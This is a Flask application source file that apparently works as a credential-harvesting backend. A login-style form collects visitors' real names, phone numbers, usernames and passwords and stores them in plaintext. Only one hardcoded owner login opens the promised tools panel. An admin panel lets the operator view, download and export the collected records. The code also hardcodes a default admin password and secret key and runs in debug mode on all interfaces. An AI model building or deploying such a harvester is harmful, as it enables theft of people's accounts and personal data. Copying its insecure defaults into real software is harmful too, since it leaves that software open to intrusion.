from flask import Flask, render_template, request, redirect, url_for, session, send_file, flash, jsonify
import json
from pathlib import Path
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "change_this_secret")

DATA_FILE = Path("logins.json")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "JAI BABA KI")  # change in prod via env

# ensure data file exists
if not DATA_FILE.exists():
    DATA_FILE.write_text("[]", encoding="utf-8")

def load_data():
    try:
        return json.loads(DATA_FILE.read_text(encoding="utf-8"))
    except Exception:
        return []

def save_data(data):
    DATA_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")

@app.route("/")
def index():
    # Tools panel
    return render_template("index.html")

@app.route("/owner", methods=["GET"])
def owner():
    return render_template("owner.html")

@app.route("/submit", methods=["POST"])
def submit():
    # expect fields: realname, phone, username, password
    realname = request.form.get("realname", "").strip()
    phone = request.form.get("phone", "").strip()
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()

    if not (realname and phone and username and password):
        # redirect back with simple flash (client side shows alert)
        flash("Please fill all fields", "error")
        return redirect(url_for("owner"))

    # Save record (plaintext as requested). Add timestamp.
    record = {
        "name": realname,
        "phone": phone,
        "username": username,
        "password": password,
        "time": datetime.utcnow().isoformat() + "Z"
    }

    data = load_data()
    data.append(record)
    save_data(data)

    # If the provided username/password are the owner credentials open index
    if username == "ROWEDY" and password == "KINGXKING":
        return redirect(url_for("index"))
    # otherwise show a simple confirmation page (or back to owner)
    return render_template("submit_ok.html", name=realname)

# ADMIN LOGIN (simple)
@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        pw = request.form.get("admin_pass", "")
        if pw == ADMIN_PASSWORD:
            session["is_admin"] = True
            return redirect(url_for("admin_panel"))
        else:
            flash("Wrong admin password", "error")
            return redirect(url_for("admin"))

    return render_template("admin.html")

@app.route("/admin/panel")
def admin_panel():
    if not session.get("is_admin"):
        return redirect(url_for("admin"))
    data = load_data()
    return render_template("panel.html", users=data)

@app.route("/admin/download")
def admin_download():
    if not session.get("is_admin"):
        return redirect(url_for("admin"))
    # send logins.json
    return send_file(str(DATA_FILE), as_attachment=True, download_name="logins.json", mimetype="application/json")

@app.route("/admin/clear", methods=["POST"])
def admin_clear():
    if not session.get("is_admin"):
        return redirect(url_for("admin"))
    save_data([])
    flash("All records cleared", "success")
    return redirect(url_for("admin_panel"))

# optional: API to list (if you want JSON)
@app.route("/api/logins")
def api_logins():
    # protected by admin session
    if not session.get("is_admin"):
        return jsonify({"error": "unauthenticated"}), 401
    return jsonify(load_data())

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
